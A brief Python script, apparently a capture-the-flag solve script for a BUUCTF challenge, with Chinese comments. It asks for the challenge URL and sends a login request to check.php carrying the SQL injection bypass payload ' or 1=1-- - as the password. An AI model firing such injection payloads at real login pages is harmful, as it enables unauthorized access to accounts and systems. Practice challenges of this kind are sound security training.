import requests

# 1. 用户输入基础 URL (例如 http://xxxx.node5.buuoj.cn:81/)
base_url = input("请输入题目网址: ").strip('/')

# 2. 拼接你提供的 Payload 路径
target_url = f"{base_url}/check.php?username=admin&password=' or 1=1-- -"

# 3. 发送请求并直接打印结果
# 注意：requests 会自动处理 URL 编码
response = requests.get(target_url)
print(response.text)